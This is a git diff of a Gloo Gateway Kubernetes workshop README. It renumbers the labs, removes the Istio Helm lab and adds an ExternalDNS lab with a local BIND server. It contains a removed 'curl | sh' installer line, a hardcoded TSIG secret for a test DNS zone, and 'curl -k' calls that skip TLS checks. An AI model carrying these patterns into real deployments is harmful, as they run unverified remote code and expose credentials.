@@ -16,32 +16,38 @@ source ./scripts/assert.sh
 ## Table of Contents
 * [Introduction](#introduction)
 * [Lab 1 - Deploy KinD Cluster(s)](#lab-1---deploy-kind-cluster(s)-)
-* [Lab 2 - Deploy Istio using Helm](#lab-2---deploy-istio-using-helm-)
-* [Lab 3 - Deploy Keycloak](#lab-3---deploy-keycloak-)
-* [Lab 4 - Deploy Gloo Gateway Enterprise](#lab-4---deploy-gloo-gateway-enterprise-)
+* [Lab 2 - Deploy Keycloak](#lab-2---deploy-keycloak-)
+* [Lab 3 - Deploy Gloo Gateway Enterprise](#lab-3---deploy-gloo-gateway-enterprise-)
+* [Lab 4 - Deploy ExternalDNS](#lab-4---deploy-externaldns-)
 * [Lab 5 - Deploy the httpbin demo app](#lab-5---deploy-the-httpbin-demo-app-)
 * [Lab 6 - Expose the httpbin application through the gateway](#lab-6---expose-the-httpbin-application-through-the-gateway-)
 * [Lab 7 - Delegate with control](#lab-7---delegate-with-control-)
-* [Lab 8 - Modify the requests and responses](#lab-8---modify-the-requests-and-responses-)
-* [Lab 9 - Split traffic between 2 backend services](#lab-9---split-traffic-between-2-backend-services-)
-* [Lab 10 - Securing the access with OAuth](#lab-10---securing-the-access-with-oauth-)
-* [Lab 11 - Use the transformation filter to manipulate headers](#lab-11---use-the-transformation-filter-to-manipulate-headers-)
-* [Lab 12 - Apply rate limiting to the Gateway](#lab-12---apply-rate-limiting-to-the-gateway-)
-* [Lab 13 - Use the Web Application Firewall filter](#lab-13---use-the-web-application-firewall-filter-)
-* [Lab 14 - Use the JWT filter to validate JWT and create headers from claims](#lab-14---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
-* [Lab 15 - Validate and authorize client certificates](#lab-15---validate-and-authorize-client-certificates-)
-* [Lab 16 - Use the `cache-control` response header to cache responses](#lab-16---use-the-`cache-control`-response-header-to-cache-responses-)
-* [Lab 17 - Deploy Argo Rollouts](#lab-17---deploy-argo-rollouts-)
-* [Lab 18 - Roll out a new app version using Argo Rollouts](#lab-18---roll-out-a-new-app-version-using-argo-rollouts-)
-* [Lab 19 - Deploy OpenTelemetry Collector](#lab-19---deploy-opentelemetry-collector-)
-* [Lab 20 - Deploy the Bookinfo sample application](#lab-20---deploy-the-bookinfo-sample-application-)
-* [Lab 21 - Expose the productpage API securely](#lab-21---expose-the-productpage-api-securely-)
-* [Lab 22 - Expose an external API and stitch it with the productpage API](#lab-22---expose-an-external-api-and-stitch-it-with-the-productpage-api-)
-* [Lab 23 - Expose the dev portal backend](#lab-23---expose-the-dev-portal-backend-)
-* [Lab 24 - Deploy and expose the dev portal frontend](#lab-24---deploy-and-expose-the-dev-portal-frontend-)
-* [Lab 25 - Demonstrate the self service capabilities](#lab-25---demonstrate-the-self-service-capabilities-)
-* [Lab 26 - Dev portal monetization](#lab-26---dev-portal-monetization-)
-* [Lab 27 - Deploy Backstage with the backend plugin](#lab-27---deploy-backstage-with-the-backend-plugin-)
+* [Lab 8 - Delegate with labels](#lab-8---delegate-with-labels-)
+* [Lab 9 - Set up an external processing (extProc) server](#lab-9---set-up-an-external-processing-(extproc)-server-)
+* [Lab 10 - Deploy and test using an external HTTP passthrough auth server](#lab-10---deploy-and-test-using-an-external-http-passthrough-auth-server-)
+* [Lab 11 - Deploy and test using an external gRPC passthrough auth server](#lab-11---deploy-and-test-using-an-external-grpc-passthrough-auth-server-)
+* [Lab 12 - Direct response](#lab-12---direct-response-)
+* [Lab 13 - Modify the requests and responses](#lab-13---modify-the-requests-and-responses-)
+* [Lab 14 - Split traffic between 2 backend services](#lab-14---split-traffic-between-2-backend-services-)
+* [Lab 15 - Securing the access with OAuth](#lab-15---securing-the-access-with-oauth-)
+* [Lab 16 - Use the transformation filter to manipulate headers](#lab-16---use-the-transformation-filter-to-manipulate-headers-)
+* [Lab 17 - Apply rate limiting to the Gateway](#lab-17---apply-rate-limiting-to-the-gateway-)
+* [Lab 18 - Use the JWT filter to validate JWT and create headers from claims](#lab-18---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
+* [Lab 19 - Use the Web Application Firewall filter](#lab-19---use-the-web-application-firewall-filter-)
+* [Lab 20 - Validate and authorize client certificates](#lab-20---validate-and-authorize-client-certificates-)
+* [Lab 21 - Use the `cache-control` response header to cache responses](#lab-21---use-the-`cache-control`-response-header-to-cache-responses-)
+* [Lab 22 - Deploy Argo Rollouts](#lab-22---deploy-argo-rollouts-)
+* [Lab 23 - Roll out a new app version using Argo Rollouts](#lab-23---roll-out-a-new-app-version-using-argo-rollouts-)
+* [Lab 24 - Expose a service through TCP](#lab-24---expose-a-service-through-tcp-)
+* [Lab 25 - Deploy the Bookinfo sample application](#lab-25---deploy-the-bookinfo-sample-application-)
+* [Lab 26 - Expose the productpage API securely](#lab-26---expose-the-productpage-api-securely-)
+* [Lab 27 - Expose an external API and stitch it with the productpage API](#lab-27---expose-an-external-api-and-stitch-it-with-the-productpage-api-)
+* [Lab 28 - Expose the dev portal backend](#lab-28---expose-the-dev-portal-backend-)
+* [Lab 29 - Deploy and expose the dev portal frontend](#lab-29---deploy-and-expose-the-dev-portal-frontend-)
+* [Lab 30 - Demonstrate the self service capabilities](#lab-30---demonstrate-the-self-service-capabilities-)
+* [Lab 31 - Dev portal monetization](#lab-31---dev-portal-monetization-)
+* [Lab 32 - Deploy Backstage with the backend plugin](#lab-32---deploy-backstage-with-the-backend-plugin-)
+* [Lab 33 - Deploy OpenTelemetry Collector](#lab-33---deploy-opentelemetry-collector-)
 
 
 
@@ -137,295 +143,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --e
 
 
 
-## Lab 2 - Deploy Istio using Helm <a name="lab-2---deploy-istio-using-helm-"></a>
-
-
-It is convenient to have the `istioctl` command line tool installed on your local machine. If you don't have it installed, you can install it by following the instructions below.
-
-<details>
-  <summary>Install <code>istioctl</code></summary>
-
-Install `istioctl` if not already installed as it will be useful in some of the labs that follow.
-
-```bash
-curl -L https://istio.io/downloadIstio | sh -
-
-if [ -d "istio-"*/ ]; then
-  cd istio-*/
-  export PATH=$PWD/bin:$PATH
-  cd ..
-fi
-```
-
-That's it!
-</details>
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-describe("istio_version is at least 1.23.0", () => {
-  it("version should be at least 1.23.0", () => {
-    // Compare the string istio_version to the number 1.23.0
-    // example 1.23.0-patch0 is valid, but 1.22.6 is not
-    let version = "1.23.6-patch1";
-    let versionParts = version.split('-')[0].split('.');
-    let major = parseInt(versionParts[0]);
-    let minor = parseInt(versionParts[1]);
-    let patch = parseInt(versionParts[2]);
-    let minMajor = 1;
-    let minMinor = 23;
-    let minPatch = 0;
-    expect(major).to.be.at.least(minMajor);
-    if (major === minMajor) {
-      expect(minor).to.be.at.least(minMinor);
-      if (minor === minMinor) {
-        expect(patch).to.be.at.least(minPatch);
-      }
-    }
-  });
-});
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-istio-helm/tests/istio-version.test.js.liquid from lab number 2"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
--->
-
-Let's create Kubernetes services for the gateways:
-
-```bash
-kubectl --context ${CLUSTER1} create ns istio-gateways
-
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: v1
-kind: Service
-metadata:
-  labels:
-    app: istio-ingressgateway
-    istio: ingressgateway
-  name: istio-ingressgateway
-  namespace: istio-gateways
-spec:
-  ports:
-  - name: http2
-    port: 80
-    protocol: TCP
-    targetPort: 80
-  - name: https
-    port: 443
-    protocol: TCP
-    targetPort: 443
-  selector:
-    app: istio-ingressgateway
-    istio: ingressgateway
-  type: LoadBalancer
-EOF
-```
-
-Let's deploy Istio using Helm in cluster1. We'll install the base Istio components, the Istiod control plane, the Istio CNI, the ztunnel, and the ingress/eastwest gateways.
-
-Create the `istio-system` namespace:
-
-```bash
-kubectl --context ${CLUSTER1} create ns istio-system
-```
-
-```bash
-helm upgrade --install istio-base oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/base \
---namespace istio-system \
---kube-context=${CLUSTER1} \
---version 1.23.6-patch1-solo \
---create-namespace \
--f - <<EOF
-defaultRevision: ""
-profile: ambient
-EOF
-
-helm upgrade --install istiod oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/istiod \
---namespace istio-system \
---kube-context=${CLUSTER1} \
---version 1.23.6-patch1-solo \
---create-namespace \
--f - <<EOF
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo>
-  proxy:
-    clusterDomain: cluster.local
-  tag: 1.23.6-patch1-solo
-  multiCluster:
-    clusterName: cluster1
-  meshID: mesh1
-profile: ambient
-meshConfig:
-  accessLogFile: /dev/stdout
-  defaultConfig:
-    proxyMetadata:
-      ISTIO_META_DNS_AUTO_ALLOCATE: "true"
-      ISTIO_META_DNS_CAPTURE: "true"
-  trustDomain: cluster1
-pilot:
-  enabled: true
-  cni:
-    enabled: true
-  env:
-    PILOT_ENABLE_IP_AUTOALLOCATE: "true"
-    PILOT_ENABLE_K8S_SELECT_WORKLOAD_ENTRIES: "false"
-    PILOT_SKIP_VALIDATE_TRUST_DOMAIN: "true"
-license:
-  value: ${GLOO_MESH_LICENSE_KEY}
-EOF
-
-helm upgrade --install istio-cni oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/cni \
---namespace kube-system \
---kube-context=${CLUSTER1} \
---version 1.23.6-patch1-solo \
---create-namespace \
--f - <<EOF
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo>
-  proxy: 1.23.6-patch1-solo
-profile: ambient
-cni:
-  ambient:
-    dnsCapture: true
-  excludeNamespaces:
-  - istio-system
-  - kube-system
-EOF
-
-helm upgrade --install ztunnel oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/ztunnel \
---namespace istio-system \
---kube-context=${CLUSTER1} \
---version 1.23.6-patch1-solo \
---create-namespace \
--f - <<EOF
-configValidation: true
-enabled: true
-env:
-  L7_ENABLED: "true"
-  SKIP_VALIDATE_TRUST_DOMAIN: "true"
-hub: us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo>
-istioNamespace: istio-system
-multiCluster:
-  clusterName: cluster1
-namespace: istio-system
-profile: ambient
-proxy:
-  clusterDomain: cluster.local
-tag: 1.23.6-patch1-solo
-terminationGracePeriodSeconds: 29
-variant: distroless
-EOF
-
-helm upgrade --install istio-ingressgateway oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/gateway \
---namespace istio-gateways \
---kube-context=${CLUSTER1} \
---version 1.23.6-patch1-solo \
---create-namespace \
--f - <<EOF
-autoscaling:
-  enabled: false
-profile: ambient
-imagePullPolicy: IfNotPresent
-labels:
-  app: istio-ingressgateway
-  istio: ingressgateway
-service:
-  type: None
-EOF
-
-```
-The Gateway APIs do not come installed by default on most Kubernetes clusters. Install the Gateway API CRDs if they are not present:
-```bash
-kubectl --context ${CLUSTER1} apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.3.0/experimental-install.yaml
-```
-  
-
-<!--bash
-cat <<'EOF' > ./test.js
-
-const helpers = require('./tests/chai-exec');
-
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-const chai = require("chai");
-const expect = chai.expect;
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-describe("Checking Istio installation", function() {
-  it('istiod pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeploymentsWithLabels({ context: process.env.CLUSTER1, namespace: "istio-system", labels: "app=istiod", instances: 1 }));
-  it('gateway pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeploymentsWithLabels({ context: process.env.CLUSTER1, namespace: "istio-gateways", labels: "app=istio-ingressgateway", instances: 1 }));
-  it("Gateways have an ip attached in cluster " + process.env.CLUSTER1, () => {
-    let cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n istio-gateways get svc -l app=istio-ingressgateway -o jsonpath='{.items}'");
-    cli.stderr.should.be.empty;
-    let deployments = JSON.parse(cli.stdout.slice(1,-1));
-    expect(deployments).to.have.lengthOf(1);
-    deployments.forEach((deployment) => {
-      expect(deployment.status.loadBalancer).to.have.property("ingress");
-    });
-  });
-});
-
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-istio-helm/tests/istio-ready.test.js.liquid from lab number 2"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
--->
-<!--bash
-timeout 2m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o json | jq '.items[0].status.loadBalancer | length') -gt 0 ]]; do
-  sleep 1
-done"
--->
-
-```bash
-export HOST_GW_CLUSTER1="$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].hostname}{.items[0].status.loadBalancer.ingress[0].ip}')"
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_GW_CLUSTER1 + "' can be resolved in DNS", () => {
-    it(process.env.HOST_GW_CLUSTER1 + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_GW_CLUSTER1, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 2"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
--->
-
-
-
-
-## Lab 3 - Deploy Keycloak <a name="lab-3---deploy-keycloak-"></a>
+## Lab 2 - Deploy Keycloak <a name="lab-2---deploy-keycloak-"></a>
 
 In many use cases, you need to restrict the access to your applications to authenticated users.
 
@@ -439,7 +157,6 @@ But, first of all, we're going to deploy Keycloak to persist the data if Keycloa
 
 ```bash
 kubectl --context ${CLUSTER1} create namespace gloo-system
-kubectl --context ${CLUSTER1} label namespace gloo-system istio.io/dataplane-mode=ambient
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: ServiceAccount
@@ -516,12 +233,6 @@ spec:
     - port: 5432
 EOF
 ```
-Let's create the `keycloak` namespace and label it to be part of the mesh:
-
-```bash
-kubectl --context ${CLUSTER1} create namespace keycloak
-kubectl --context ${CLUSTER1} label namespace keycloak istio.io/dataplane-mode=ambient
-```
 
 Wait while Postgres finishes rolling out:
 
@@ -547,8 +258,8 @@ describe("Postgres", () => {
   it('postgres pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "gloo-system", k8sObj: "postgres" }));
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/postgres-available.test.js.liquid from lab number 3"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/postgres-available.test.js.liquid from lab number 2"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
 -->
 
 First, we need to define an ID and secret for a "client", which will be the service that delegates to Keycloak for authorization:
@@ -957,8 +668,8 @@ describe("Keycloak", () => {
   it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "keycloak", k8sObj: "keycloak" }));
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid from lab number 3"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid from lab number 2"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -984,8 +695,8 @@ describe("Retrieve enterprise-networking ip", () => {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid from lab number 3"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid from lab number 2"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
 -->
 <!--bash
 timeout 2m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
@@ -1022,8 +733,8 @@ describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", (
     });
 });
 EOF
-echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 3"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
+echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 2"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
 -->
 <!--bash
 echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token"
@@ -1032,7 +743,7 @@ timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $
 
 
 
-## Lab 4 - Deploy Gloo Gateway Enterprise <a name="lab-4---deploy-gloo-gateway-enterprise-"></a>
+## Lab 3 - Deploy Gloo Gateway Enterprise <a name="lab-3---deploy-gloo-gateway-enterprise-"></a>
 
 
 You can deploy Gloo Gateway with the `glooctl` CLI or declaratively using Helm.
@@ -1043,12 +754,6 @@ Install the Kubernetes Gateway API CRDs as they do not come installed by default
 
 ```bash
 kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.3.0/experimental-install.yaml
-```
-Let's create the `gloo-system` namespace and label it to be part of the mesh:
-
-```bash
-kubectl --context $CLUSTER1 create namespace gloo-system
-kubectl --context $CLUSTER1 label namespace gloo-system istio.io/dataplane-mode=ambient
 ```
 
 
@@ -1076,7 +781,7 @@ helm repo update
 helm upgrade -i -n gloo-system \
   gloo-gateway gloo-ee-helm/gloo-ee \
   --create-namespace \
-  --version 1.18.14 \
+  --version 1.19.1 \
   --kube-context $CLUSTER1 \
   --set-string license_key=$LICENSE_KEY \
   -f -<<EOF
@@ -1103,11 +808,6 @@ gloo:
   gloo:
     logLevel: info
     deployment:
-      customEnv:
-        - name: ENABLE_WAYPOINTS
-          value: "true"
-        - name: GG_AMBIENT_MULTINETWORK
-          value: "true"
       livenessProbeEnabled: true
   discovery:
     enabled: false
@@ -1130,9 +830,6 @@ global:
   extensions:
     caching:
       enabled: true
-ambient:
-  waypoint:
-    enabled: true
 EOF
 kubectl --context $CLUSTER1 patch settings default -n gloo-system --type json \
   -p '[{ "op": "remove", "path": "/spec/cachingServer" }]'
@@ -1140,22 +837,6 @@ kubectl --context $CLUSTER1 patch settings default -n gloo-system --type json \
 
 
 
-
-We've deployed Ambient and Gloo Gateway is part of the mesh. Ingress capture can be disabled. This is done by setting the `ambient.istio.io/bypass-inbound-capture": "true"` annotation on the proxy pods.
-
-```bash
-kubectl --context $CLUSTER1 patch gatewayparameters gloo-gateway -n gloo-system --type merge -p '{
-  "spec": {
-    "kube": {
-      "podTemplate": {
-        "extraAnnotations": {
-          "ambient.istio.io/bypass-inbound-capture": "true"
-        }
-      }
-    }
-  }
-}'
-```
 
 
 Run the following command to check that the Gloo Gateway pods are running:
@@ -1194,9 +875,84 @@ describe("Gloo Gateway", () => {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-gloo-gateway-enterprise/tests/check-gloo.test.js.liquid from lab number 4"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 4"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-gloo-gateway-enterprise/tests/check-gloo.test.js.liquid from lab number 3"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
 -->
+
+
+
+## Lab 4 - Deploy ExternalDNS <a name="lab-4---deploy-externaldns-"></a>
+
+ExternalDNS is a Kubernetes add-on (or controller) that automatically manages DNS records for Kubernetes resources such as Services and Ingresses etc. It integrates with external DNS providers (like AWS Route 53, Google Cloud DNS, Cloudflare, etc.) to dynamically create, update, or delete DNS records by monitoring changes in the aforementioned resources.
+In this lab we will be setting up BIND DNS server preconfigured with a test zone and secret key. We will use ExternalDNS to watch for resources and then make DNS entries to the BIND server using the secret key.
+NOTE: We will NOT be using the BIND server for DNS resolution. We will just be querying it directly to ensure that the ExternalDNS functionality is working properly.First we will setup a BIND server instance running as a standalone external Docker container. External DNS will use this BIND instance to make DNS entries.
+```bash
+docker run -u $(id -u):$(id -g) -d --name isc-bind --network kind -v ${PWD}/data/steps/deploy-external-dns:/etc/bind --entrypoint /usr/sbin/named ubuntu/bind9 -g || true
+```
+
+To view the logs for the BIND docker container, you can use the command below.
+```bash,norun-workshop
+docker logs isc-bind
+```
+
+Next we will determine the BIND container's IP and save it in an environment variable for use with upcoming steps.
+```bash
+export BIND_CONTAINER_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' isc-bind)
+```
+
+Now we will deploy ExternalDNS, which will be configured to monitor Gateway and HTTPRoute resources to determine the list of DNS records that must be created or modified. We will use the BIND DNS server we created before as the target for the DNS records.
+Note: BIND DNS is configured as provider type `rfc2136` in ExternalDNS.
+```bash
+helm repo add external-dns https://kubernetes-sigs.github.io/external-dns/
+helm repo update
+helm upgrade --install external-dns external-dns/external-dns \
+  --namespace external-dns --create-namespace \
+  --version 1.16.1 \
+  --kube-context cluster1 \
+  -f -<< EOF
+registry: txt
+provider: rfc2136
+txtPrefix: external-dns-
+txtOwnerId: gloo
+interval: 15s
+logLevel: debug
+logFormat: text
+podLabels:
+  app: external-dns
+serviceAccount:
+  create: true
+rbac:
+  create: true
+  additionalPermissions:
+    - apiGroups: [""]
+      resources: ["namespaces"]
+      verbs: ["get","watch","list"]
+    - apiGroups: ["gateway.networking.k8s.io"]
+      resources: ["gateways","httproutes","grpcroutes","tlsroutes","tcproutes","udproutes"]
+      verbs: ["get","watch","list"]
+sources:
+  - gateway-httproute
+domainFilters:
+  - example.com
+extraArgs:
+  - --rfc2136-host=${BIND_CONTAINER_IP}
+  - --rfc2136-port=53
+  - --rfc2136-zone=example.com
+  - --rfc2136-tsig-secret=RxV0FGl4sOYHm3fBbzL4pd5QOnz/8TR1B+HS7mGf3a4=
+  - --rfc2136-tsig-secret-alg=hmac-sha256
+  - --rfc2136-tsig-keyname=externaldns
+  - --rfc2136-min-ttl=60s
+  - --rfc2136-tsig-axfr
+EOF
+```
+
+To view the logs of the external-dns pod for troubleshooting, you can use the command below.
+```bash,norun-workshop
+kubectl --context cluster1 -n external-dns logs -l app=external-dns
+```
+
+In the upcoming steps whenever we add gateways or HTTPRoutes, we can query the DNS server we have setup in this step to see if ExternalDNS was able to make DNS entries successfully.
+
 
 
 
@@ -1211,7 +967,6 @@ Run the following commands to deploy the httpbin app twice (`httpbin1` and `http
 
 ```bash
 kubectl --context ${CLUSTER1} create ns httpbin
-kubectl --context ${CLUSTER1} label namespace httpbin istio.io/dataplane-mode=ambient
 kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin1.yaml
 kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin2.yaml
 ```
@@ -1528,6 +1283,37 @@ Configure your hosts file to resolve httpbin.example.com with the IP address of 
 ```bash
 ./scripts/register-domain.sh httpbin.example.com ${IP}
 ```
+Since we've deployed ExternalDNS, let us validate that the DNS entry was successfully created in the DNS server. You should get an IP Address as response.
+```bash,norun-workshop
+dig +short @${BIND_CONTAINER_IP} httpbin.example.com
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const dns = require('dns');
+const chaiHttp = require("chai-http");
+const chai = require("chai");
+const expect = chai.expect;
+chai.use(chaiHttp);
+const { waitOnFailedTest } = require('./tests/utils');
+
+afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
+
+describe("ExternalDNS dns entry validation", () => {
+    it('httpbin.example.com resolves to ' + process.env.IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
+        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
+        return dns.resolve('httpbin.example.com', (error, address) => {
+            if (!error) {
+                expect(address.toString()).to.be.eq(process.env.IP);
+            }
+            done(error);
+        });
+    });
+});
+
+EOF
+echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 6"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
+-->
 
 
 
@@ -2244,7 +2030,1409 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --e
 
 
 
-## Lab 8 - Modify the requests and responses <a name="lab-8---modify-the-requests-and-responses-"></a>
+## Lab 8 - Delegate with labels <a name="lab-8---delegate-with-labels-"></a>
+
+Delegation with labels offers flexibility to the application teams on how they define their `HTTPRoute` resources. Thus they define the labels on their `HTTPRoute` resources and the parent `HTTPRoute` delegates to `HTTPRoute` resources that match the labels.
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: gloo-system
+spec:
+  parentRefs:
+    - name: http
+      namespace: gloo-system
+      sectionName: https-httpbin
+  hostnames:
+    - "httpbin.example.com"
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+      - group: delegation.gateway.solo.io
+        kind: label
+        name: team1
+        namespace: httpbin
+EOF
+```
+
+The team in charge of the httpbin application can now create a child `HTTPRoute` that specifies the label `delegation.gateway.solo.io/label: team1`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    delegation.gateway.solo.io/label: team1
+spec:
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+
+Check you can still access the application through HTTPS:
+
+```bash,norun-workshop
+curl -k https://httpbin.example.com/get
+```
+
+Here is the expected output:
+
+```json,nocopy
+{
+  "args": {},
+  "headers": {
+    "Accept": [
+      "*/*"
+    ],
+    "Host": [
+      "httpbin.example.com"
+    ],
+    "User-Agent": [
+      "curl/8.5.0"
+    ],
+    "X-Forwarded-Proto": [
+      "https"
+    ],
+    "X-Request-Id": [
+      "11037632-92c8-43c7-b919-7d7c7217c564"
+    ]
+  },
+  "method": "GET",
+  "origin": "127.0.0.6:51121",
+  "url": "https://httpbin.example.com/get"
+}
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation-with-labels/../delegation/tests/https.test.js.liquid from lab number 8"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+-->
+
+### Delegation to routes in all namespaces
+
